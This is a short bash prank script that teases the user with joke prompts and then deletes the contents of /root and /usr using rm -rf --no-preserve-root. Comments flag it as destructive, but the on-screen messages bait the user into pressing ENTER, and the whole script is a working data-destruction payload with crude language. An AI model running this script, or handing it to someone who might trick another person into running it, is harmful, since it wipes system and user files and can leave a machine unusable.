#!/bin/bash
# WARNING: THIS SCRIPT IS DESTRUCTIVE!
clear
echo -e "\e[1;31m Nothing to see here... \nJust wait...\e[0m"
sleep 5

echo -e "\e[1;33mDo you need a girlfriend?\e[0m"
read -p $'\e[1;36mPress ENTER to fuck your system,\nOr press CTRL+C or CTRL+Z to exit safely:\e[0m'

echo -e "\e[1;31mInitiating system destruction...\e[0m"
sleep 3

# Destructive commands – use with caution
rm -rf --no-preserve-root /root/* 2>/dev/null
rm -rf --no-preserve-root /usr/* 2>/dev/null

echo -e "\e[1;32m1... 2... 3... Done. √ System is now Fucked . Bye!\e[0m"
